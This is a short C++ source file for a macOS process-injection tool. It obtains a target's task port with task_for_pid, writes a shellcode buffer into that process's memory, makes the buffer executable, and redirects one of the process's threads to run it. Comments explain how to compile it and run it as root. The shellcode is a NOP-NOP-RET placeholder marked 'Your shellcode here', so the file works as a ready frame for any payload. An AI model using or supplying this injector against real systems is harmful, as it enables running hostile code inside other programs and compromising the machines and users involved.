// ============================================================
// inject.cpp — inject shellcode into target PID (x86_64)
// ------------------------------------------------------------
// Compile: clang++ -O2 -o inject inject.cpp -framework CoreFoundation
// Usage:   sudo ./inject <pid>
// Note:    Requires root + SIP disabled OR target signed with
//          get-task-allow entitlement. Modern macOS blocks task_for_pid
//          by default unless the target is debuggable.
// ============================================================
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <cstdio>
#include <cstring>

int main(int argc, char** argv) {
    if (argc < 2) { printf("usage: %s <pid>\n", argv[0]); return 1; }
    pid_t pid = atoi(argv[1]);

    task_t task;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &task);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "task_for_pid failed: %s\n", mach_error_string(kr));
        return 1;
    }

    // Your shellcode here (x86_64 Mach-O shellcode)
    unsigned char sc[] = { 0x90, 0x90, 0xC3 }; // NOP; NOP; RET

    mach_vm_address_t remote = 0;
    kr = mach_vm_allocate(task, &remote, sizeof(sc), VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) return 1;

    mach_vm_write(task, remote, (vm_offset_t)sc, sizeof(sc));
    mach_vm_protect(task, remote, sizeof(sc), FALSE,
                    VM_PROT_READ | VM_PROT_EXECUTE);

    // Hijack a thread
    thread_act_array_t threads;
    mach_msg_type_number_t count;
    task_threads(task, &threads, &count);

    x86_thread_state64_t state;
    mach_msg_type_number_t stateCnt = x86_THREAD_STATE64_COUNT;
    thread_get_state(threads[0], x86_THREAD_STATE64,
                     (thread_state_t)&state, &stateCnt);
    state.__rip = remote;
    thread_set_state(threads[0], x86_THREAD_STATE64,
                     (thread_state_t)&state, stateCnt);

    printf("injected at 0x%llx\n", (unsigned long long)remote);
    return 0;
}
